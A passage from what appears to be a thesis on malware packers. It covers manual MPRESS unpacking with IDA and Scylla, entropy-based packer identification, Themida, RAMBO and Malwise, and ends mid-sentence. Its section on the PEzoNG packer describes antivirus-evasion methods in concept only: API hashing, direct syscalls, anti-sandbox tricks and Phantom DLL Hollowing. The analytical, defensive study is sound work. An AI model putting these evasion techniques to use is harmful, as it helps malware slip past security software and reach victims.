the execution of a program at a specific memory address or when a particular condition is met. Hardware breakpoint is an essential tool for debugging complex software, analyzing malware, and investigating software vulnerabilities. These breakpoints are typically implemented using specialized registers called debug registers, which are part of the processor\'s debugging architecture.</p>","<p>To set a hardware breakpoint, the debugger configures one of the available debug registers with the desired memory address or condition. The debug register is then monitored by the processor, which halts program execution when any instruction attempts to read, write, or execute the specified address or the condition is met.</p>","<p>Given this introduction we can proceed to the process of identifying a packed binary with MPRESS which is identical to that of UPX, as shown above. Upon loading the binary packed with MPRESS we receive a similar message to the UPX one, but in this case, clearly stating that the file was packed.</p>","<p><img src=\\"/cyber/thesis/31.png\\" alt=\\"\\"></p>","<p>Once the binary had been loaded, we are supposed to face a \\"pusha\\" instruction. If this is not the case, we can simply select the start function and insert a breakpoint.</p>","<p><img src=\\"/cyber/thesis/32.png\\" alt=\\"\\"></p>","<p>Then, we run the binary, paying particular attention to the Stack View window (usually it is located in the bottom-right corner of the IDA <sup>[5]</sup> window).</p>","<p><img src=\\"/cyber/thesis/33.png\\" alt=\\"\\"></p>","<p>Upon stepping over once we can notice that the addresses on the stack had changed (shown in the image below).</p>","<p><img src=\\"/cyber/thesis/34.png\\" alt=\\"\\"></p>","<p>At this point, the stack is pointing to start. We have to step over until we come back again to \u201cstart\u201d since the start appears twice on the stack, once at 9FF64 and once at 9FF68. In this example, it was enough to do \u201cStep Over\u201d twice.</p>","<p><img src=\\"/cyber/thesis/35.png\\" alt=\\"\\"></p>","<p>Note that we started from the \\"pusha\\" instruction at 4512D7 and then moved to 4512DE. Then we right clicked on the stack address 19FF64 and followed it in the hex dump.</p>","<p><img src=\\"/cyber/thesis/36.png\\" alt=\\"\\"></p>","<p>The \u201cHex View-1\u201d window changed, and a byte gets highlighted.</p>","<p><img src=\\"/cyber/thesis/37.png\\" alt=\\"\\"></p>","<p>At this point, we select the four bytes (DWORD) starting from D7 and put a breakpoint on it. We also set the breakpoint to be a hardware breakpoint with read and write permission (WR), in this case, IDA <sup>[5]</sup> automatically enables these permissions. Although it is possible to view and modify the breakpoint which we don\u2019t need in this case.</p>","<p><img src=\\"/cyber/thesis/38.png\\" alt=\\"\\"></p>","<p>At this point we run the binary with the Play button. Once the binary is running, at a certain point it hit the hardware breakpoint. This was done in search of the Original Entry Point (OEP).</p>","<p><img src=\\"/cyber/thesis/39.png\\" alt=\\"\\"></p>","<p>IDA <sup>[5]</sup> then detected that RIP point is not in a defined address similarly as sees as of the UPX.</p>","<p><img src=\\"/cyber/thesis/40.png\\" alt=\\"\\"></p>","<p>After pressing \u201cYes\u201d, the code changes, and we are suddenly in a call instruction. When we stepped into it, IDA <sup>[5]</sup> told me the same message about RIP pointing to an undefined address. We cannot use the address of the call instruction (402BA6) as we did for UPX. Instead, we have to use the address pointed out by the call instruction (401B54).</p>","<p><img src=\\"/cyber/thesis/41.png\\" alt=\\"\\"></p>","<p>Finally, the address 401B54 can be used as the Original Entry Point (OEP) and unpack with Scylla <sup>[6]</sup>. Once found the OEP the unpacking process with Scylla <sup>[6]</sup> is very much the same as the one seed for the UPX which we will perform to validate its correctness. It is important to remember to restart Scylla <sup>[6]</sup> due to its bug and as seen previously we cannot close IDA <sup>[5]</sup> which was in debugging mode to let Scylla <sup>[6]</sup> use the process in execution.</p>","<p>In order to unpack the steps to follow are the same as seen for UPX:</p>","<p><ol><li>Select the process of IDA <sup>[5]</sup> running the sample.</li><li>Insert in the OEP field the address found on IDA <sup>[5]</sup>.</li><li>Click \u201cIAT Autosearch\u201d</li></ol></p>","<p>Upon setting up Scylla <sup>[6]</sup> with the new values for the malware sample, it successfully finds the start address and its size.</p>","<p><img src=\\"/cyber/thesis/42.png\\" alt=\\"\\"></p>","<p>At this point, we obtained all the imports by simply clicking \u201cGet Imports\u201d.</p>","<p><img src=\\"/cyber/thesis/43.png\\" alt=\\"\\"></p>","<p>Scylla <sup>[6]>/sup> shows that 68 imports are found since we own the unpacked binary, we can double-checked if the found imports matched the original number of imports.</p>","<p><img src=\\"/cyber/thesis/44.png\\" alt=\\"\\"></p>","<p>In fact, PEStudio <sup>[3]</sup> had told us that the unpacked binary had 68 imports, so our process was successful. Now to create the unpacked binary, we first create a dump by clicking on \\"Dump\\" and saved the new file. </p>","<p><img src=\\"/cyber/thesis/45.png\\" alt=\\"\\"></p>","<p>Now we click \u201cFix Dump\u201d and select the dump file previously created in order to unpack it and create the unpacked binary.</p>","<p><img src=\\"/cyber/thesis/46.png\\" alt=\\"\\"></p>","<p>To make further check we can load the newly created binary in PEStudio <sup>[3]</sup> and compared it with the original packed binary to see their differences.</p>","<p><img src=\\"/cyber/thesis/47.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/48.png\\" alt=\\"\\"></p>","<p>Finally, we could see the differences between the original packed binary and the unpacked binary that we created. Much like UPX, even here, the same value changes, even if the change is not significant. The unpacked version with Scylla <sup>[6]</sup> has 0 imports, which was the same as UPX. It is not a problem as long as Scylla <sup>[6]</sup> has found all the imports during the process.</p>","<p>This concludes the manual unpacking of binaries packed of MPRESS.</p>"]}]},{"id":"6 Advanced Technique for Packer Identification","title":"<h2> <span style=\\"color:#da1953\\">Adv</span>anced Technique for Packer Identification</h2>","body":["<p>As we have seen, identifying whether a file is packed or not is very important and it is even more important to know beforehand which packer used to pack the malware. Malware writers often modify information regarding the packer within the executable to reduce the identification of the used packer by changing certain parameters such as the header or section names. In such a case the techniques shown earlier in section \\"UPX\\" may not be particularly effective and the amount of information obtained would be particularly reduced. </p>","<p>An advanced and innovative technic to identify the packer is proposed of the paper \\"Packer identification method based on byte sequences\\", which achieves the result by extracting some features from the packed fire executable. In particular this paper proposes a \u201cpacker identification method based on features extracted only from the code sections of binary executable files. Because the characteristics of code sections cannot be easily changed by malware developers <sup>[7]</sup>\u201d.  The value of entropy and the frequency of bytes in the code section is used to extract these features.</p>","<p><i>\u201cThe Encrypted Section Extraction process identifies each section based on the header information of a packed executable file. After identifying sections in an executable file, the entropy scores of each section are calculated, and the section with the highest score is selected as an encrypted section. In the Feature Extraction process, features are extracted from the binary sequences of the encrypted section <sup>[7]</sup>\u201d.</i></p>","<p>After extracting the features, they are analyzed with machine learning algorithms to analyze and identify the type of packer used and finally the results are evaluated to calculate the accuracy of the identification divided for each different packer used.</p>","<p>An overall process overview can be seen in the following image:</p>","<p><img src=\\"/cyber/thesis/49.png\\" alt=\\"\\"></p>","<p>The first step of the process is to identify the section encrypted by the packer and this is done by calculating the entropy. Usually, PE files contain the name of the encrypted section as the table below shows. But this information is easily modified by malware writes to make the identification more challenging reason why the entropy is calculated in order to detect the encrypted section.</p>","<p><img src=\\"/cyber/thesis/50.png\\" alt=\\"\\"></p>","<p><i>\u201cEntropy is defined as a degree of disorder or uncertainty in a system <sup>[7]</sup>\u201d</i>. A high number of entropies is a clear indication of encryption, and it is computed for each section of the PE file and the encrypted section will have a higher entropy compared to other section of the executable as sown in the image below.</p>","<p><img src=\\"/cyber/thesis/51.png\\" alt=\\"\\"></p>","<p>These values can be misled the final result due to the fact that <i>\u201cbinary executable files can have null paddings at the end of a section, and these null paddings can affect the entropy score of the section. To mitigate the effects of null paddings, our scoring method calculates the entropy scores of byte sequences in n- byte sliding windows for a single section <sup>[7]</sup>\u201d</i>. </p>","<p><img src=\\"/cyber/thesis/52.png\\" alt=\\"\\"></p>","<p>In the proposed paper <sup>[7]</sup> the entropy is not only used to identify if an executable is packed or not but also to identify the packer itself because <i>\u201cdifferent packing algorithms are used by different packers; the statistical values of entropy values may also be different. Then, different statistical values can be used as features to identify different packers <sup>[7]</sup>\u201d</i>.</p>","<p>Analyzing the byte sequence of an encrypted section and extracting features can reveal the packer as the encrypted section is a list of random byte values and different packer uses different encryption algorithm, they will generate different entropy sequence. To such purpose the encrypted section is analyzed byte-by-byte. <i>\u201cThe entropy score sequence is defined as a list of entropy values of byte sequences within the n -byte sliding window <sup>[7]</sup>\u201d</i>. The following image shows an example of an executable packed with ASPack <sup>[29]</sup> and show and shows a unique pattern of entropy.</p>","<p><img src=\\"/cyber/thesis/53.png\\" alt=\\"\\"></p>","<p>The paper also analyzed different packing algorithms and was able to find concrete values to distinguish the employed packer. Thus, these features shown in the image below can be used to distinguish different packers in use.</p>","<p><img src=\\"/cyber/thesis/54.png\\" alt=\\"\\"></p>","<p>Until now we have seen one of the two proposed technique, feature extraction form entropy. Now let\u2019s see the second technique which is the analysis of the byte sequence and how it can reveal the packer.</p>","<p>The strategy is to analyze all the bytes of the sections, the byte values between 0x00 and 0xFF and calculating the number of occurrences of each byte to generate the frequencies. One of the problems during this phase is that the byte 0x00 is also used as padding at the end of each section so all the bytes 0x00 that are at the end of a section will be ignored to generate an accurate result.</p>","<p>In the paper <sup>[7]</sup> two particular packers have been studied, UPX and ASPack and they generated respectively the following frequency graph:</p>","<p><img src=\\"/cyber/thesis/55.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/56.png\\" alt=\\"\\"></p>","<p>From the frequency analysis we can clearly distinguish the two packers in use and incorporate such information during the analysis process. Such information often is crucial as it may save time and speed up the analysis phase which is often time consuming for unknows or custom packers.</p>"]},{"id":"7 Advanced Packers","title":"<h2> <span style=\\"color:#da1953\\">7 Adv</span>anced Packers</h2>","body":["<p>So far, we have seen and analyzed very simple packers, it is important to describe the behaviour of more advanced packers to understand how far they can go. For this reason, I have chosen a very advanced packer to protect Windows software, Themida. Themida is a commercial packer, it implements state-of-the-art security measures to make it difficult and complicated to analyze.</p>","<p>The goal, in fact, is to avoid decompilation, and Themida, for this, falls well within the category of software protector. The problem that Themida effectively solves is that the techniques employed by classic packers are all mostly known, and they can be unpacked. The executable is first decompiled and broken down into portions, each of which is protected, and then reassembly and a second phase of protection of the entire file is performed, resulting in the final executable.</p>","<p>All processes are managed by an architecture based on virtual micro-machines (<i>\u201ca virtual machine program that serves to isolate an untrusted computing operation <sup>[8]</sup>\u201d</i>), each dedicated to real-time encoding and decoding of the pieces into which the executable is decomposed. Code virtualization, in Themida, can be managed in a granular manner, selecting the type of virtualization based on parameters such as execution speed (which is more or less affected depending on the technology chosen) and the size of the executable. And based on these parameters that the complexity of decoding and analysis of the processed files varies.</p>","<p>Below are few features of Themida that are noteworthy:</p>","<p><ol><li>Anti-API scanners techniques that avoid reconstruction of original import table.</li><li>Anti-memory dumpers techniques.</li><li>Anti-debugger techniques that detect/fool any kind of debugger.</li><li>Multiple polymorphic layers with more than 50.000 permutations.</li></ol></p>","<p>The Themida packer is a highly advanced and intricate tool used to protect software from reverse engineering and analysis. It incorporates multiple anti-analysis and evasion techniques, making it challenging to analyze using simple methods.</p>","<p>Another very famous packer among malware writers\u2019 worth mentioning is Armadillo. When Armadillo is run it creates two separate processes where the first process acts as a debugger to the second to catch exceptions during execution. When the program attempts to execute the encrypted code, an exception is triggered because the required code is not present in the memory in its decrypted form. This exception is caught by the debugger process, which is monitoring the execution of the program. The debugger process then takes control and decrypts the required page of memory, making the decrypted code available for execution. This decrypted code is loaded into the memory of the program, replacing the encrypted version. As a result, the program can now execute the previously protected code.</p>","<p>To successfully understand and analyze complex packers like Themida and Armadillo, we need to employ more advanced strategies and techniques. In the next chapters, we will explore these advanced approaches, enabling us to effectively analyze and comprehend the inner workings of complex packers.</p>",{"id":"7.1 Advanced Packing Techniques","title":"<h3>7.1 Advanced Packing Techniques</h3>","body":["<p>As can be seen, such a complex packer that implements several anti-analysis and evasion techniques cannot be analyzed in a simple way as seen in the previous examples and they require different strategies. The following chapters will discuss advanced strategies for analyzing and understanding the implementation of packed malware with advanced packing strategies.</p>","<p><i>\u201cMore complex packers often involve several layers of unpacking routines, in which the first layer unpacks the second one, which in turn unpacks another routine, until the original code is reconstructed at the end of the chain. Others employ several parallel processes, they interleave the execution of unpacking code with the original code, or even incrementally unpack and re-pack the code on-demand before and after its execution <sup>[93]</sup>\u201d</i>.</p>","<p>Following a subset of advanced unpacking techniques presented in the paper \u201cSoK: Deep Packer Inspection: A Longitudinal Study of the Complexity of Run-Time Packers\u201d:</p>","<ol><li>Parallel Unpackers</li><li>Unpacking Frames</li><li>Code Visibility</li></ol>","<p><b>Parallel Unpackers</b> is a strategy where <i>\u201cpackers employ several processes in order to unpack the original code <sup>[9]</sup>\u201d</i>. These processes can interact with one another to perform various checks such as synchronization or time measurement to avoid detection and analysis.</p>","<p><img src=\\"/cyber/thesis/57.png\\" alt=\\"\\"></p>","<p><b>Unpacking Frame</b> <i>\u201cis a region of memory in which we observe a sequence of a memory write followed by a memory execution. Traditional run-time packers have one unpacking frame for each layer, because the code is fully unpacked in one layer before the next layers are unprotected. We call these packers single-frame unpackers. However, more complex cases exist in which the code of one layer is reconstructed and executed one piece at a time. These cases involve multiple frames per layer and are called multi-frame packers in our terminology <sup>[9]</sup>\u201d</i>.</p>","<p><img src=\\"/cyber/thesis/58.png\\" alt=\\"\\"></p>","<p><b>Code Visibility</b> is an <i>\u201cadvanced multi-frame examples exist that selectively unpack only the portion of code that is actually executed. This approach is used as a mechanism to prevent analysts and tools from easily acquiring a memory dump of the entire content of the binary <sup>[9]</sup>\u201d</i>. There are different types of unpacking mechanism such as: Full -Code Unpacking which is a routine that unpack the entire code and executes it. Incremental Unpacking is an approach where the code in unpacked, if necessary, before being executed but not all the code are unpacked. Shifting-Decode Frames is a strategy where only one frame at a time is visible and unpacked and the previews unpacked frame are repacked to reduce the visibility.</p>","<p><img src=\\"/cyber/thesis/59.png\\" alt=\\"\\"></p>"]},{"id":"7.2 Deep Dive into PEzoNG and Advanced Malware Packer","title":"<h3>7.2 Deep Dive into PEzoNG and Advanced Malware Packer</h3>","body":["<p>PEzoNG is a packer for Windows that implements various evasion techniques and anti-analysis mechanism. <i>\u201cPEzoNG is built with modularity in mind and allows to add new features in a simple way by adding new modules that could implement different techniques with a fine grained detail <sup>[10]</sup>\u201d</i>. In this way it is possible to add new techniques and implement additional feature to add to the packer and develop new evasion strategies. PEzoNG is a polymorphic packer which means that its signature changes from computation to computation which makes Anti Viruses that checks for trivial signature ineffective.</p>","<p>The image below shows an overview of the packing and unpacking overview of PEzoNG:</p>","<p><img src=\\"/cyber/thesis/60.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/61.png\\" alt=\\"\\"></p>","<p>PEzoNG includes the following modules:</p>","<p><ol><li>Encryption</li><li>APIs</li><li>Syscall</li><li>Evasion</li><li>PE Loader</li><li>Shellcode Injeciton</li></ol></p>",{"id":"7.2.1 Encryption-Decryption Strategy","title":"<h4>7.2.1 Encryption/Decryption Strategy</h4>","body":["<p>PEzoNG uses a 256bit key and a python script t encrypt the malware and embeds the key in the header and different encryption algorithm can be selected. Also, the decryption happens in two stages as the encryption in order to avoid detection by Anti Viruses. As Anti Viruses can choose to run always one branch of if-else statements by changing the condition implementing the decryption accordingly can avoid the extraction of the malware. Antiviruses also tries to avoid performing high computation in order to maintain in order to maintain a smooth user experience.</p>","<p>The code below shows an example of a two-stage decryption with high computation:</p>","<p><img src=\\"/cyber/thesis/62.png\\" alt=\\"\\"></p>","<p>The two if-else statement with the addition of a huge computation inside one of the branches prevent AVs from evaluating all the branches and the successful decryption of the malicious code.</p>"]},{"id":"7.2.2 APIs","title":"<h4>7.2.2 APIs</h4>","body":["<p>As malware packer uses several Windows APIs, many of them can be potentially flagged by security software as malicious and prevent a successful infection as their names are present in the IAT. To avoid such PEzoNG <i>\u201cimplemented an automatic functioncall obfuscation method which allows to dynamically resolveany Windows API address at run-time without ever specifying the API name <sup>[10]</sup>\u201d</i>. The strategy consists in computing the hash value of the API names, the hash of a specific API then is checked with a computed hash of the function in the Process \u201cEnvironment Block\u201d that contains the names of the needed APIs.</p>","<p><i>\u201cSince all the APIs used by PEzoNG belongs to two dynamic libraries ntdll.dll and kernelbase.dll which are always loaded by Windows into every process address space, all of them can be correctly resolved at run-time <sup>[10]</sup>\u201d</i>. In this way the API names never appear in the PE file, and it avoids using \u201cLoadLybrary\u201d and \u201cGetProcAddress\u201d which are indicator of packing.</p>"]},{"id":"7.2.3 Systemcalls and Evations","title":"<h4>7.2.3 Systemcalls and Evations</h4>","body":["<p>PEzoNG, for some operations, invoke directly the system calls without relying on APIs with the help of \u201cSyswhispers2 [11]\u201d. For example, the API call VirtualAlloc uses the system call NtAllocateVirtualMemory and using directly the NT syscall avoid security software from user space hooking . This is possible due to the fact that <i>\u201cin user-space Zw* functions (kernel-level functions) are at the same address of the corresponding Nt* function (user-level function) <sup>[10]</sup>\u201d</i>. Reordering by address the Zw* function will provide the system call number  which is needed to perform the call.</p>"]},{"id":"7.2.4 Anti-Sandbox","title":"<h4>7.2.4 Anti-sandbox</h4>","body":["<p>PEzoNG make use of <i>\u201cOffer you have to refuse <sup>[12]</sup>\u201d</i> method. This method consists of using large number of resources such as memory or CPU, and as AVs have to analyze huge number of files, they cannot use cush amount of time and resources for a single file as it may lead to Denial of Service on the AV. </p>","<p>The following code are an example for memory and CPU usage:</p>","<p><img src=\\"/cyber/thesis/63.png\\" alt=\\"\\"></p>"]},{"id":"7.2.5 Main Loader and Shellcode Injection","title":"<h4>7.2.5 Main Loader and Shellcode Injection</h4>","body":["<p>Once the malicious code has been decrypted the main loader prepare it for the execution. In the event of a shellcode injection the packer employs the \u201cPhantom DLL Hollowing <sup>[34]</sup>\u201d technique. <i>\u201cPhantom Dll Hollowing looks for a dll on disk that has not already been loaded into memory and that is large enough to host the malicious payload. Once a feasible Dll is found, the loader opens the Dll using a transacted NTFS (TxF) <sup>[34]</sup>\u201d</i>.  Phantom DLL Hollowing maps the victim DLL into the memory and inject the payload keeping intact the rest of the library.</p>","<p><img src=\\"/cyber/thesis/64.png\\" alt=\\"\\"></p>","<p>With this technique PEzoNG make the payload stealthier and harder to detect as the payload is treated as a legitimate code. </p>","<p>To understand better this process, it is essential to introduce what Transacted NTFS is. Transacted NTFS is a feature of Windows that groups several operations in one single unit. If one of these operations fails all the others are considerate unsuccessful. In the case of PEzoNG it uses the Transacted NTFS feature to open the target DLL and inject the shellcode in the memory without modifying it in the disk and then the changes can be rolled-back without affecting the original file in the disk. In this way the injection is made only in the memory and not save in the disk.</p>"]},{"id":"7.2.6 Results","title":"<h4>7.2.6 Results</h4>","body":["<p>The following image shows the employed strategies against a few antiviruses if they can detect if the binary is malicious or not.</p>","<p><img src=\\"/cyber/thesis/65.png\\" alt=\\"\\"></p>","<p>As we can see the PEzoNG was undetected by the antiviruses when employing unhooking technique and a combination of all of them. In other cases, a subset of antiviruses was able to detect the executable as malicious. We can state that PEzoNG is able to successfully pack malware and pass undetected by most of the antiviruses in commerce.</p>"]}]}]},{"id":"8 A possible solution for Advanced Packers Analysis","title":"<h2> <span style=\\"color:#da1953\\">A po</span>ssible solution for Advanced Packers Analysis</h2>","body":["<p>Multiple branch observation is a technique described in the paper \\"RAMBO: Run-time packer Analysis with multiple-branch observation <sup>[13]</sup>\\" that tries to solve code partitioning problems efficiently. This technic is particularly effective when malware implements code frames shifting techniques. <i>\u201cThese packers only reveal one code region at a time, decrypting only the code covered by a single execution path <sup>[13]</sup>\u201d</i>.  This technique can also be used for advanced unpacking mechanisms implemented. The paper also discusses about the efficiency of the multiple path exploration the protected regions as it may generate overhead.</p>","<p><img src=\\"/cyber/thesis/66.png\\" alt=\\"\\"></p>","<p><i>\u201cThis approach leverages dynamic trait analysis, symbolic execution and process snapshotting in order to explore execution path in depth first order <sup>[13]</sup>\u201d</i>. The strategy mentioned is executed in two steps. In the first step we execute the malware sample in order to visit a single path  then we analyze the packer to identify the region where the code has been unpacked. In the second step we analyze the extracted code in order to find the information on how to execute a different path for a new portion of the code to be unpacked. We iterate these two steps until the packer finishes to extract all the portions of the code.</p>","<p><i>\u201cSymbolic execution allows to evaluate a program over a set of symbolic inputs instead of concrete values. A constraint solver can evaluate the symbolic expression that must be satisfied to follow a given path, providing an appropriate set of values for each input variable <sup>[13]</sup>\u201d</i>. Through the symbolic execution we can execute all the paths of the malware. But the problem of accessing the memory address remains as packers utilize indirect memory access (as shown in the image below) as an anti-analysis measure to hinder static and dynamic analysis techniques. By dynamically generating memory addresses or using complex memory access patterns, packers make it challenging for analysts to understand and track the packer\'s behaviour.</p>","<p><img src=\\"/cyber/thesis/67.png\\" alt=\\"\\"></p>","<p>Sometimes it is necessary to stop the execution in a given time for example before a conditional jump or a change of a value, for this purpose it is really useful performing system snapshots. By stopping the execution at given time it will be possible to redirect un an unexecuted branch of the program. This approach has many limitations as the operating system must save different data structure and may incur in error restoring the previews state.</p>","<p>The last approach mentioned in the paper which is applied for Shifting-Decode-Frames is to identify the stub, in charge of encrypting and decrypting portion of codes. The strategy proposed is to apply the multiple path exploration only on the protected code avoiding the stub and the anti-analysis routines which are out of our interest. To achieve this, we must identify the first decrypted portion of the code and from analyzing it we may find hints how to explore the next path and decrypt the next portion of the code.</p>","<p>The paper proposes optimization that simplify the multiple path observation to unpack binaries. For example, one of the optimizations proposed is the inconsistent multipart exploration which consist in forcing, which is consistent with the last tainted jump, to void crushes before completing examining the code and, inconsistent with the previews path restriction. This strategy overcome the challenge when packers modify the way how a program executed and make it difficult to explore its branches as standard symbolic execution certain path may not be executed. In addition, to reduce the size and the overhead of the exploration of the various paths Multiple Branch Observation limit the explored code only to regions that may contain the original code of the malware.</p>","<p>To further reduce the overhead and the complexity is to consider the local and the global consistency it is necessary to apply logical and global consistency. <i>\u201cThis means that we respect the consistency within the regions that contain the original code of the binary, but we allow the variables in this region to adopt values that are inconsistent with the rest of the code <sup>[13]</sup>\u201d</i>. The global consistency maintains coherence and compatibility across different parts of the code. It ensures that the findings and conclusions derived from analyzing various sections of the software align with each other and form a coherent understanding of the overall behaviour of the program.</p>","<p>These optimizations allow complex malware to be analyzed in a reasonable time and limited to only the portions of interest. Doing so reduces the analysis overhead to have greater accuracy in understanding the behaviour and extraction of encrypted portions from the packer. The multiple branch observation if used on malware packed with Themida as described above would greatly facilitate its analysis that would otherwise be extremely complex and time-consuming. additionally limiting the analysis to only the interested portions and thus avoiding analyzing code that deals with for example, code that does not unpack subsequent portions would further speed up the process.</p>"]},{"id":"9 Classification of Packed Files","title":"<h2> <span style=\\"color:#da1953\\">9 Cla</span>ssification of Packed Files</h2>","body":[{"id":"9.1 Introduction","title":"<h3>9.1 Introduction</h3>","body":["<p>To solve the problem of malware classification and its variant a system named Malwise [14] has been developed. This system classifies malware <i>\u201cusing a fast application-level emulator to reverse the code packing transformation, and two flowgraph matching algorithms to perform classification. An exact flowgraph matching algorithm is employed that uses string-based signatures and is able to detect malware with near real-time performance <sup>[14]</sup>\u201d</i>.</p>","<p> The innovative technique that Malwise uses is the use of structuring and decompilation to generate malware signature. Structuring a malware consists in rearranging the code in a more understandable manner which helps to understand patterns and logical flow of it. Decompilation is used to convert the low-level code to a pseudo higher level for a better understanding of it and analysis.</p>","<p>The approach of Malwise to generate the signature is divided in two parts and they consist of \u201cExact Matching\u201d, Malwise look for the exact match of a control flow graph from a malware database to classify the input binary, and \u201cApproximate Matching\u201d Malwise search for similarity between the input flow graph and the database to classify binaries respecting a given threshold.</p>"]},{"id":"9.2 Detecting Packin","title":"<h3>9.2 Detecting Packing</h3>","body":["<p>The first step is to understand if the malware employs packing techniques. This is done by computing the entropy of the input file as a packed file most like have high entropy compared to a non-packed one. <i>\u201cIf the binary is identified as being packed, then the dynamic analysis to perform automated unpacking proceeds. If the binary is not packed, then the static analysis commences immediately <sup>[14]</sup>\u201d</i>.</p>"]},{"id":"9.3 Detect Code Extraction (Unpacking Completion)","title":"<h3>9.3 Detect Code Extraction (Unpacking Completion)</h3>","body":["<p>Malwise detects the OEP by tracking the memory writes <sup>[15]</sup>. The idea behind this technique discussed in Renovo [15] is that regardless the employed packing technique eventually the original code should be preset in the memory to be executed and the instruction pointer must jump to the address (OEP) of the extracted program to execute it at runtime.</p>","<p><img src=\\"/cyber/thesis/68.png\\" alt=\\"\\"></p>","<p>Malwise improved this concept in the event of multi-layer packing and can identify precisely in which state the OEP will be revealed. The idea is that <i>\u201cif there exist high entropy packed data that have not been used by the packer during execution, then they remain to be unpacked. To determine if a particular stage of unpacking represents the OEP, the entropy of new or unread memory in the process image is examined. Newly written memory is indicated by the shadow memory  for the current stage being unpacked. Unread memory is maintained globally, in a shadow memory for all stages. If the entropy of the analyzed data is low, then it is presumed that no more compressed or encrypted data are left to be unpacked. This heuristically indicates completion of unpacking <sup>[14]</sup>\u201d</i>.</p>","<p><img src=\\"/cyber/thesis/69.png\\" alt=\\"\\"></p>"]},{"id":"9.4 Static Analysis","title":"<h3>9.4 Static Analysis</h3>","body":["<p>The objective of the static analysis is to extract characteristics from the unpacked binary. The characteristics are then transformed in a higher-level representation that are suitable from string matching (signature). For such a purpose Exacts Flow Graph and Approximate Flow Graph matching are employed.</p>"]},{"id":"9.5 Exact Flow Graph Matching","title":"<h3>9.5 Exact Flow Graph Matching</h3>","body":["<p>Once the characteristics of the input binary has been extracted a higher level of control flow graph is created and its signature is also generated. The signature is then compared with the database of malware signatures (consisted of graph edges and ordered nodes) in search of isomorphism. The figure below shows and example of control flow graph and the signature of it.</p>","<p><img src=\\"/cyber/thesis/70.png\\" alt=\\"\\"></p>"]},{"id":"9.6 Approximate Flow Graph","title":"<h3>9.6 Approximate Flow Graph</h3>","body":["<p>Using the approximate flow graph is possible to identify a greater number of malware variants compared to the previews matching technique. In this process structuring is used to generate signatures to compare the similarity with the signatures in the database. <i>\u201cStructuring is the process of recovering high-level structured control flow from a control flow graph. The intuition behind using structuring as a signature is that similarities between malware variants are reflected by variants sharing similar high-level structured control flow <sup>[14]</sup>\u201d</i>.</p>","<p>The reason of performing structuring of code is because malware variants have similarities at a higher-level representation of their structure and control flow. Structuring produces a string of characters representing the higher-level representation of the malware code block. Following an example of the signature generation:</p>","<p><img src=\\"/cyber/thesis/71.png\\" alt=\\"\\"></p>","<p>Malwise uses a database containing the signature generate from flow graphs of known malware in string format. To classify an input binary the signature is then compared with the database in search of similarities. \u201cFor exact matching, the assignment is based on string equality. <i>\\"For approximate matching, a greedy assignment is made for the best approximate matching string where the similarity ratio is above 0.9 <sup>[14]</sup>\\"</i>\u201d.</p>"]},{"id":"9.7 Similarity","title":"<h3>9.7 Similarity</h3>","body":["<p>The greedy match of 0.9 threshold is used to identify potential exact matches and in the final classification a threshold of 0.6 is used to identify malware variants. Both thresholds are used in the result for malware identification and a lower threshold is used for a broader match for flexibility and capture even slightly modified versions of malware.</p>","<p>The problem that arises from this approach is the match with several malwares. For such reason the similarity check process is divided in two stages. The stage is the search for uniqueness, the input malware is compared with the database to check if it\u2019s a unique malware or has been already seen previously by comparing its extracted features. In the second step the remaining duplicated are compared with a lower threshold of 0.6 in search of similarities and malware variants. Only the exact matches or the matches above 0.6 are returned as a result of the searching process.</p>"]},{"id":"9.8 Evaluation","title":"<h3>9.8 Evaluation</h3>","body":["<p>The following tables shows the accuracy of Malwise in identifying the OEP of binaries (HOSTNAME.EXE and CALC.EXE) packed with different packers.</p>","<p><img src=\\"/cyber/thesis/72.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/73.png\\" alt=\\"\\"></p>","<p>From the table we can see that Malwise has a great accuracy in finding the OEP even in cases of several layer of several layer of packing. Malwise failed the unpacking of CALC.EXE only when packed with \u201cnapck\u201d, \u201cexpressor\u201d, \u201ctelock\u201d, and \u201cpespin\u201d. It failed 4 out of 14 packer which is an impressive result, and it was able in most of the cases to reveal more than 98% of the packed instructions.</p>","<p>The performance evaluation shows that thanks to the immersive speed of Malwise, as shown below, is suitable to be integrated into desktop anti malware systems.</p>","<p><img src=\\"/cyber/thesis/74.png\\" alt=\\"\\"></p>"]}]},{"id":"10 Packers on Embedded Systems","title":"<h2><span style=\\"color:#da1953\\">10 Pa</span>ckers on Embedded Systems</h2>","body":[{"id":"10.1 Embedded Systems and IoT","title":"<h3>10.1Embedded Systems and IoT</h3>","body":["<p>With the emergence of IoT and Embedded Systems, malicious users have adapted to exploit these technologies for malicious purposes. In this regard, it is important how much and how packing impacts them.</p>","<p>The difference between Embedded System and IoT lies in connectivity. That is, an IoT device is connected to the Internet e.g., a washing machine or refrigerator that can offer real-time information. On the other hand, an embedded system is like a minicomputer build for a specific use case, equipped with minimal computing power, and it is not connected to the internet.</p>","<p>Normally an embedded system does not have an Internet connection, but an IoT embedder does, so an embedded system can be considered a subset of IoT. So, these types of devices can be used by malicious users to carry out further attacks or perform packing and unpacking of malware.</p>","<p>Theoretically it is possible to carry out cyber-attacks from a compromised IoT device, its only limitation would be the available device resources such as processing power and memory. More specifically if we talk about packing <i>\u201cWhile packing, in general, helps reduce the size of the stored binary, the unpacking/decryption time increases the total instructions executed and leads to increased power consumption <sup>[56]</sup></i>\u201d.</p>"]},{"id":"10.2 Performance Evaluation","title":"<h3>10.2 Performance Evaluation</h3>","body":["<p>The study experimented with two packers, AES Encryption and UPX, with the addition of a simple anti-debugging feature, time delay, <i>\u201cwhen single-stepping a process through a debugger the wall clock differences between any two points will grow dramatically when compared to a native execution. Time based anti-debugging software can perform two time checks and infer that it is running under such conditions if unusual difference is detected [56]</sup></i>\u201d.</p>","<p>The experiment was conducted against the embedded board, which consists of Intel XScale PXA255 400MHz CPU, 128MB SDRAM, 32MB Flash ROM, Embedded Linux (Kernel 2.4.19) and g++ was used to compile the executables. Its result proved that UPX several times faster that AES because of the AES decryption overhead also <i>\u201cUPX is better than AES-encryption packing for reducing the startup time and invocation time on embedded systems with limited resources <sup>[56]</sup></i>\u201d.</p>","<p>Regarding power consumption (W=V\xb7I\xb7t=Volt\xb7Ampere\xb7milliseconds), it was not possible to keep the electric current stable so there is a margin of error of \xb12%. UPX showed very low power consumption compared with AES. In this regard, AES can be optimized with power consumption reduction in mind.</p>","<p>The two programs binary that have been choose for these experiments are MD5 hashing 